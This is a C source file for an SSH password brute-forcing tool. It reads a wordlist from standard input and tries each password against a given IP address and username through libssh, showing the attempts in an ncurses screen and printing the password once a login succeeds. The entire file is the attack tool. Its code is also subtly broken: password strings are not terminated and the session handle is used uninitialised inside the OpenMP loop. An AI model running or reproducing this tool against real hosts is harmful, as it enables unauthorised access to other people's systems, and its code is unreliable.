#include <libssh/libssh.h>
#include <ncurses.h>
#include <fcntl.h>
#include <stdlib.h>
#include <omp.h>

int main(int argc, char **argv)
{
	if(argc < 3)
	{
		printf("cat wordlist |./sshash ip username");
		exit(-1);
	}
	initscr();
	cbreak();
	noecho();
	int port = 22;
	char pass[128];
	
	ssh_init();

	char c;
	int scroll;
	
	#pragma omp taskloop firstprivate(pass, c, scroll)
	for(long int X=0; X<0xffffffff; ++X)
	{
		int rc;
		ssh_session SSH;
		if(X % 6 == 0)
		{	
			if(X != 0)
			{
				ssh_disconnect(SSH);
				ssh_free(SSH);
			}
			SSH = ssh_new();
	
			ssh_options_set(SSH, SSH_OPTIONS_HOST, argv[1]);
			ssh_options_set(SSH, SSH_OPTIONS_USER, argv[2]);
	
			if(ssh_connect(SSH) != 0)
			{
				endwin();
				printf("%s\n", ssh_get_error(SSH));
				exit(-1);
			}
		}
		scroll = 0;
		while(1)
		{
			read(0, &c, 1);
			if(c == '\n') break;
			pass[scroll] = c;
			++scroll;
		}	
		rc = ssh_userauth_password(SSH, NULL, pass);
		if(rc != SSH_AUTH_SUCCESS)
		{
			mvprintw(0, 0, "%s:%s:%s\n", argv[1], argv[2], pass);
			refresh();
			continue;
		}
		else
		{
			endwin();
			printf("Password is %s\n", pass);
			ssh_disconnect(SSH);
			ssh_free(SSH);
			X = 0xffffffffe;
		}
	}
}
